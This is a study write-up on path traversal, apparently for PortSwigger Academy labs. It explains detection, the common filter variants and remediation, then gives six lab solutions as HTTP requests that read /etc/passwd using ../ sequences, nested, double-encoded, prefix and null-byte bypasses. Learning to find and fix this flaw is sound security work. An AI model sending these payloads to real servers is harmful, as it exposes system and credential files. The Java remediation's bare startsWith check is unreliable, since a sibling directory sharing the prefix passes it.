## 1. Vulnerability Core

- **Vulnerability Type:** Path Traversal (Directory Traversal)
    
- **Core Meaning:** This flaw allows an attacker to abuse user-controlled input parameter fields to read arbitrary files hosted on the underlying application server's storage system (such as system configurations, application source code, or backend credentials).
    
- **Target Environment References:**
    
    - **Unix/Linux Target Objective:** `/etc/passwd`
        
    - **Windows Target Objective:** `..\..\..\windows\win.ini`
        

## 2. Detection & Attack Surface Mapping

Look for parameters handling file retrieval, downloads, or local rendering resources:

- **Typical Parameters:** `?filename=`, `?file=`, `?path=`, `?src=`, `?image=`
    
- **Testing Routine:** Intercept resource requests using Burp Suite and manipulate values using standard traversal strings (`../`), absolute paths (`/`), obfuscated encodings, or null-byte completions to analyze filesystem parsing reactions.
    

## 3. Classifications (The Scenarios)

- **Simple Absolute/Relative Mappings:** Unfiltered concatenation of parameters direct to system path APIs.
    
- **Non-Recursive Stripping Filters:** Applications applying quick `String.replace("../", "")` functions exactly once. This can be subverted using nested tokens like `....//`.
    
- **Superfluous Input Decoding:** Security gates blocking cleartext combinations but incorrectly applying post-filtering URL/double-URL decodings.
    
- **Prefixed Context Constraints:** Systems ensuring a strict directory prefix signature matches (e.g., must begin with `/var/www/images`).
    
- **Extension Trailing Constraints:** File validation rules checking for specific end characters (e.g., must end with `.png`), which can sometimes be cut off prematurely on backend file handling APIs using null characters (`%00`).
    

## 4. Remediation

- **Avoid Direct Filesystem Access:** Map client-supplied keys to hardcoded identifier lists or database indexes rather than sending raw strings to file APIs.
    
- **Path Canonicalization Check:** Force verification logic that resolves full directory paths natively on the server side and explicitly validates bounds constraints:
    
    Java
    
    ```
    File file = new File(BASE_DIRECTORY, userInput);
    if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
        // Safe to process file
    }
    ```

## 5. Lab Breakthroughs & Payloads

### Lab 1: File path traversal, simple case

- **Attack Vector:** Standard naked parameter concatenation allowing unchecked direct relative folder switching.

### SOLUTION & PAYLOAD BREAKDOWN

**Exploitation Routine (Payload):** Intercept the product image request string and replace the default value parameter with your traversal sequence:

HTTP

```
GET /loadImage?filename=../../../etc/passwd HTTP/1.1
Host: victim-id.web-security-academy.net
Connection: close
```


### Lab 2: File path traversal, traversal sequences blocked with absolute path bypass

- **Attack Vector:** Relative tracking elements (`../`) are explicitly blocked, but the root base folder configuration resolves directly via absolute paths.
    

### SOLUTION & PAYLOAD BREAKDOWN

**Exploitation Routine (Payload):** Supply the absolute file path target vector directly, dropping any relative tracking elements entirely:

> HTTP
> 
> ```
> GET /loadImage?filename=/etc/passwd HTTP/1.1
> Host: victim-id.web-security-academy.net
> Connection: close
> ```

### Lab 3: File path traversal, traversal sequences stripped non-recursively

- **Attack Vector:** Non-recursive sanitation filter checks that clear out the single explicit string iteration match pattern `../`.
    

 ### **LAB EXPLOIT & PAYLOAD BREAKDOWN** 
 
 **Exploitation Routine (Payload):** Use nested strings (`....//`). When the system strips the inner `../` block pattern out once, the remaining outer characters snap together to form a fully operational `../` command.

 HTTP
 ```
 GET /loadImage?filename=....//....//....//etc/passwd HTTP/1.1
Host: victim-id.web-security-academy.net
 Connection: close
 ```

### Lab 4: File path traversal, traversal sequences stripped with superfluous URL-decode

- **Attack Vector:** Double URL-decoding sequence bypass. The network WAF controls evaluate the parameter safely in its cleartext or single-encoded form, but pass the tracking down to an inner framework function that automatically performs an unsafe extra decode before usage.
    

 ### 🛑 LAB EXPLOIT & PAYLOAD BREAKDOWN
 
 **Exploitation Routine (Payload):** Double-encode the traversal separator character `/`.
 
  - `/` single URL-encodes to `%2f`
     
 - `%2f` double URL-encodes to `%252f`

 HTTP
 
 ```
  GET /loadImage?filename=..%252f..%252f..%252fetc/passwd HTTP/1.1
 Host: victim-id.web-security-academy.net
 Connection: close
 ```

### Lab 5: File path traversal, validation of start of path

- **Attack Vector:** Rigid structural requirement forcing the value string to start explicitly with the standard application base asset folder.
### LAB EXPLOIT & PAYLOAD BREAKDOWN

**Exploitation Routine (Payload):** Prepend the required absolute folder destination structure first, then immediately append the relative traversal sequences right after it to work your way back up.

HTTP

```
GET /loadImage?filename=/var/www/images/../../../etc/passwd HTTP/1.1
Host: victim-id.web-security-academy.net
Connection: close
```


### Lab 6: File path traversal, validation of file extension with null byte bypass

- **Attack Vector:** Rigid structural validation requiring an approved file format extension wrapper (like `.png`), which can be broken inside environments running legacy file API architectures (like older Java versions) that interpret null bytes as a hard line stop.
    

 ### **** LAB EXPLOIT & PAYLOAD BREAKDOWN****
 
 **Exploitation Routine (Payload):** Append a URL-encoded null byte value (`%00`) immediately following your target file objective destination, and trailing finish with the mandated dummy asset extension format indicator parameter.
 
 HTTP
 ```
 GET /loadImage?filename=../../../etc/passwd%00.png HTTP/1.1
 Host: victim-id.web-security-academy.net
 Connection: close
 ```